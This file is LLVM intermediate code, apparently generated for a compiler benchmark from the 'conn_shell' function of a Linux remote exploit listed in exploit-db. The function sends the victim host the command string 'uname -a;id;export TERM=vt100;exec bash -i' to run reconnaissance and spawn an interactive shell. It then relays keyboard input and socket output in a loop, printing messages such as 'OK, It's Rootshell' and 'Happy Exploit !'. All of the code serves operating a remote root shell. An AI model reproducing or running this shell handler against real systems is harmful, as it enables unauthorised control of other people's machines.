; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_934.c_conn_shell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_934.c_conn_shell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [44 x i8] c"uname -a;id;export TERM=vt100;exec bash -i\0A\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [37 x i8] c" #\0A # Kill two bird with one stone!\0A\00", align 1
@.str.2 = private unnamed_addr constant [27 x i8] c" # OK, It's Rootshell\0A #\0A\0A\00", align 1
@STDIN_FILENO = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [27 x i8] c" #\0A # Happy Exploit !\0A #\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"%s\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @conn_shell(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca [1024 x i8], align 16
  %6 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  store i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str, i64 0, i64 0), i8** %4, align 8
  %7 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %8 = call i32 @memset(i8* %7, i32 0, i32 1024)
  %9 = load i32, i32* @stdout, align 4
  %10 = call i32 @fprintf(i32 %9, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.1, i64 0, i64 0))
  %11 = load i32, i32* @stdout, align 4
  %12 = call i32 @fprintf(i32 %11, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.2, i64 0, i64 0))
  %13 = load i32, i32* %2, align 4
  %14 = load i8*, i8** %4, align 8
  %15 = load i8*, i8** %4, align 8
  %16 = call i32 @strlen(i8* %15)
  %17 = call i32 @send(i32 %13, i8* %14, i32 %16, i32 0)
  br label %18

18:                                               ; preds = %1, %67
  %19 = load i32, i32* @stdout, align 4
  %20 = call i32 @fflush(i32 %19)
  %21 = call i32 @FD_ZERO(i32* %6)
  %22 = load i32, i32* %2, align 4
  %23 = call i32 @FD_SET(i32 %22, i32* %6)
  %24 = load i32, i32* @STDIN_FILENO, align 4
  %25 = call i32 @FD_SET(i32 %24, i32* %6)
  %26 = load i32, i32* %2, align 4
  %27 = add nsw i32 %26, 1
  %28 = call i32 @select(i32 %27, i32* %6, i32* null, i32* null, i32* null)
  %29 = load i32, i32* %2, align 4
  %30 = call i64 @FD_ISSET(i32 %29, i32* %6)
  %31 = icmp ne i64 %30, 0
  br i1 %31, label %32, label %48

32:                                               ; preds = %18
  %33 = load i32, i32* %2, align 4
  %34 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %35 = call i32 @read(i32 %33, i8* %34, i32 1024)
  store i32 %35, i32* %3, align 4
  %36 = load i32, i32* %3, align 4
  %37 = icmp sle i32 %36, 0
  br i1 %37, label %38, label %42

38:                                               ; preds = %32
  %39 = load i32, i32* @stdout, align 4
  %40 = call i32 @fprintf(i32 %39, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.3, i64 0, i64 0))
  %41 = call i32 @exit(i32 0) #3
  unreachable

42:                                               ; preds = %32
  %43 = load i32, i32* %3, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 %44
  store i8 0, i8* %45, align 1
  %46 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %47 = call i32 @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i8* %46)
  br label %48

48:                                               ; preds = %42, %18
  %49 = load i32, i32* @STDIN_FILENO, align 4
  %50 = call i64 @FD_ISSET(i32 %49, i32* %6)
  %51 = icmp ne i64 %50, 0
  br i1 %51, label %52, label %67

52:                                               ; preds = %48
  %53 = load i32, i32* @STDIN_FILENO, align 4
  %54 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %55 = call i32 @read(i32 %53, i8* %54, i32 1024)
  store i32 %55, i32* %3, align 4
  %56 = load i32, i32* %3, align 4
  %57 = icmp sgt i32 %56, 0
  br i1 %57, label %58, label %66

58:                                               ; preds = %52
  %59 = load i32, i32* %3, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 %60
  store i8 0, i8* %61, align 1
  %62 = load i32, i32* %2, align 4
  %63 = getelementptr inbounds [1024 x i8], [1024 x i8]* %5, i64 0, i64 0
  %64 = load i32, i32* %3, align 4
  %65 = call i32 @write(i32 %62, i8* %63, i32 %64)
  br label %66

66:                                               ; preds = %58, %52
  br label %67

67:                                               ; preds = %66, %48
  br label %18
}

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i32 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @printf(i8*, i8*) #1

declare dso_local i32 @write(i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
